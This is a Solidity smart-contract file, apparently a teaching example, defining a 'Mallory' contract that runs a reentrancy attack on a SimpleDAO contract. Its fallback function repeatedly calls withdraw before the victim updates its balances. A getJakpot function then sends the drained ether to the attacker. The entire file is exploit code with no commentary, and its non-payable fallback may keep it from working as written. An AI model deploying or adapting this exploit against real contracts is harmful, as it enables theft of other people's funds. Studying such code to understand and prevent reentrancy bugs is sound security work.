pragma solidity 0.7.6;

import "./SimpleDAO.sol";

contract Mallory {
    SimpleDAO public dao;
    address payable owner;
    constructor(
        address _daoAddress
    ) {
        owner = msg.sender;
        dao = SimpleDAO(_daoAddress);
    }

    function attack() public {
        dao.donate{value: 1}(address(this));
        dao.withdraw(1);
    }
    fallback() external { dao.withdraw(dao.queryCredit(address(this))); }
    function getJakpot() public { owner.transfer(address(this).balance); }
}